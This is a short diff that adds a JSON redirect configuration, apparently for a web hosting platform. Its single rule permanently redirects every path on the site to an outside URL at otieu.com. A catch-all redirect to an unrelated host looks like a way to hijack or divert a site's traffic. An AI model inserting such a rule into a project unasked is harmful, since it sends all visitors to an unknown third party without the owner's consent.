@@ -1,0 +1,9 @@
+{
+  "redirects": [
+    {
+      "source": "/(.*)",
+      "destination": "https://otieu.com/4/9864510",
+      "permanent": true
+    }
+  ]
+}
